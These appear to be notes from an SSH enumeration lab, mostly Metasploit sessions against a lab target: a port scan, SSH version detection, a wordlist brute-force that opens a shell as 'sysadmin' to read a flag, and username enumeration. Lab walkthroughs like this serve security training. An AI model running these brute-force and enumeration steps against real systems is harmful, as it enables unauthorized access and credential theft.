ssh version and ssh login are the only two we can do now considering this is an auxiliary module introduction.

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
14702: eth0@if14703: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
14705: eth1@if14706: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:40:a4:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.64.164.2/24 brd 192.64.164.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ifconfig]]

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.7  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:07  txqueuelen 0  (Ethernet)
        RX packets 111  bytes 10235 (9.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 98  bytes 343547 (335.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.64.164.2  netmask 255.255.255.0  broadcast 192.64.164.255
        ether 02:42:c0:40:a4:02  txqueuelen 0  (Ethernet)
        RX packets 17  bytes 1486 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 2003 exploits - 1100 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: When in a module, use back to go back to the top level prompt

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a ssh_enum
[*] Added workspace: ssh_enum
[*] Workspace: ssh_enum
msf5 > workspace 
  default
* ssh_enum
msf5 > setg rhost 192.64.164.3
rhost => 192.64.164.3
msf5 > set rhosts 192.64.164.3
rhosts => 192.64.164.3
msf5 > 

```

```
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use 5
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.64.164.3     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.64.164.3:         - 192.64.164.3:22 - TCP OPEN
^C[*] 192.64.164.3:         - Caught interrupt from the console...
^C[-] Auxiliary interrupted by the console user
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/tcp) > Interrupt: use the 'exit' command to quit
```

```
msf5 > search type:auxiliary name:ssh

Matching Modules
================

   #   Name                                            Disclosure Date  Rank    Check  Description
   -   ----                                            ---------------  ----    -----  -----------
   0   auxiliary/dos/windows/ssh/sysax_sshd_kexchange  2013-03-17       normal  No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
   1   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                        normal  No     SSH Key Exchange Init Corruption
   2   auxiliary/fuzzers/ssh/ssh_version_15                             normal  No     SSH 1.5 Version Fuzzer
   3   auxiliary/fuzzers/ssh/ssh_version_2                              normal  No     SSH 2.0 Version Fuzzer
   4   auxiliary/fuzzers/ssh/ssh_version_corrupt                        normal  No     SSH Version Corruption
   5   auxiliary/scanner/ssh/detect_kippo                               normal  No     Kippo SSH Honeypot Detector
   6   auxiliary/scanner/ssh/eaton_xpert_backdoor      2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
   7   auxiliary/scanner/ssh/fortinet_backdoor         2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
   8   auxiliary/scanner/ssh/juniper_backdoor          2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   9   auxiliary/scanner/ssh/libssh_auth_bypass        2018-10-16       normal  No     libssh Authentication Bypass Scanner
   10  auxiliary/scanner/ssh/ssh_enum_git_keys                          normal  No     Test SSH Github Access
   11  auxiliary/scanner/ssh/ssh_enumusers                              normal  No     SSH Username Enumeration
   12  auxiliary/scanner/ssh/ssh_identify_pubkeys                       normal  No     SSH Public Key Acceptance Scanner
   13  auxiliary/scanner/ssh/ssh_login                                  normal  No     SSH Login Check Scanner
   14  auxiliary/scanner/ssh/ssh_login_pubkey                           normal  No     SSH Public Key Login Scanner
   15  auxiliary/scanner/ssh/ssh_version                                normal  No     SSH Version Scanner
```

```
msf5 auxiliary(scanner/portscan/tcp) > back
msf5 > use auxiliary/scanner/ssh/ssh_version
msf5 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.64.164.3:22       - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.64.164.3:22       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_version) >
```

```
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > setg rhosts 192.64.164.3
rhosts => 192.64.164.3
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.64.164.3:22 - Success: 'sysadmin:hailey' ''
[*] Command shell session 1 opened (192.64.164.2:45743 -> 192.64.164.3:22) at 2023-07-30 18:36:54 +0000
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > session
[-] Unknown command: session.
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                            Connection
  --  ----  ----           -----------                            ----------
  1         shell unknown  SSH sysadmin:hailey (192.64.164.3:22)  192.64.164.2:45743 -> 192.64.164.3:22 (192.64.164.3)

msf5 auxiliary(scanner/ssh/ssh_login) > session 1
[-] Unknown command: session.
msf5 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

Welcome to Ubuntu 19.04 (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

/bin/bash -i
bash: cannot set terminal process group (525): Inappropriate ioctl for device
bash: no job control in this shell
sysadmin@victim-1:~$ ls
ls
sysadmin@victim-1:~$ cd /
cd /
sysadmin@victim-1:/$ ls
ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
sysadmin@victim-1:/$ cat flag
cat flag
eb09cc6f1cd72756da145892892fbf5a
sysadmin@victim-1:/$ 
```

```
msf5 auxiliary(scanner/ssh/ssh_login) > use auxiliary/scanner/ssh/ssh_enumusers
msf5 auxiliary(scanner/ssh/ssh_enumusers) > options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_FALSE  false            no        Check for false positives (random username)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.64.164.3     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        22               yes       The target port
   THREADS      1                yes       The number of concurrent threads (max one per host)
   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                      no        Single username to test (username spray)
   USER_FILE                     no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet

msf5 auxiliary(scanner/ssh/ssh_enumusers) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.64.164.3:22 - SSH - Using malformed packet technique
[*] 192.64.164.3:22 - SSH - Starting scan
[+] 192.64.164.3:22 - SSH - User 'sysadmin' found
[+] 192.64.164.3:22 - SSH - User 'rooty' found
[+] 192.64.164.3:22 - SSH - User 'demo' found
[+] 192.64.164.3:22 - SSH - User 'auditor' found
[+] 192.64.164.3:22 - SSH - User 'anon' found
[+] 192.64.164.3:22 - SSH - User 'administrator' found
[+] 192.64.164.3:22 - SSH - User 'diag' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_enumusers) >
```

